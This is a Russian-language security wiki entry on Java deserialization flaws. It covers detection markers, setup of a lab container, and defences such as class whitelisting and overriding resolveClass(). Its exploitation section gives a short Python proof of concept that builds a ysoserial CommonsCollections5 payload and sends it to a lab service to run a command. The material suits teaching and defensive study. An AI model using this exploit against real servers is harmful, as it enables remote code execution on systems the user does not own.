# Deserialization (Java)


# Описание

Сериализация -- процесс перевода какой-либо структуры данных в последовательность бит, пригодную для хранения в файлах или передачи данных по сети. Десериализация -- процесс восстановления начального состояния структуры из последовательности. 

# Уязвимость

В качестве объекта для сериализации можно записать пользовательские данные, которые могут вызвать выполнение методов из уязвимых библиотек. С помощью уязвимых библиотек можно выполнить произвольный код. 

# Условия

- ОС: любая
- язык: Java
- компоненты: уязвимые библиотеки Java
- настройки: зависят от библиотеки

# Детектирование

Необходимо искать данные, которые начинаются с "AC ED 00 05" или "RO0" в случае Base64.  В header может быть указан "application/x-java-serialized-object".

## Развертывание

Запускаем [докер контейнер](https://github.com/GrrrDog/ZeroNights-WebVillage-2017/) для java. 
В данном примере уязвимый сервис будет находиться на http://java.lab


# Эксплуатация

## Шаг 1

Скачиваем [ysoserial](https://github.com/frohoff/ysoserial).

## Шаг 2

Используем следующий POC

```python
import requests
import urllib
import subprocess
import base64

# генерируем payload
payload = subprocess.check_output("java -jar ysoserial.jar CommonsCollections5 'touch /tmp/huck-you.txt'", shell=True)
# отправляем
result = requests.get('http://java.lab/ois?sess=%s' % (urllib.parse.quote(base64.b64encode(payload)),))
print(result.text)
```

Сгенерированный payload с помощью ysoserial запустит произвольный код на атакуемом сервере. При этом вылетит ошибка согласования типов, однако код всё равно запустится. 



# Защита

1. Не десериализовать объекты из недоверенных источников.
2. Запретить пользователям загрузку объектов для десериализации.
3. Своевременно обновлять библиотеки.
4. Использовать белый лист для классов десериализуемых объектов. 
5. Переопределить метод resolveClass().

При чтении потока сериализованному объекту предшествует описание класса. Эта структура позволяет  реализовать свой собственный алгоритм чтения описания класса и в зависимости от имени класса решать, следует ли продолжить чтение потока. Для этого можно использовать переопределение  метода resolveClass(). Его можно использовать для выдачи исключения всякий раз, когда поток содержит неожидаемый класс. Таким образом exception выдаётся до того, как объект начинает десериализовываться. 

# Ущерб

Подмена объекта десериализации потенциально может привести к удалённому выполнению кода на сервере. 

# Ссылки

- https://github.com/frohoff/ysoserial
- https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/
- http://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html
- https://docstore.mik.ua/orelly/java-ent/security/ch02_01.htm#SEC-CH-2-SECT-1.1
- https://www.ibm.com/developerworks/ru/library/se-lookahead/index.html
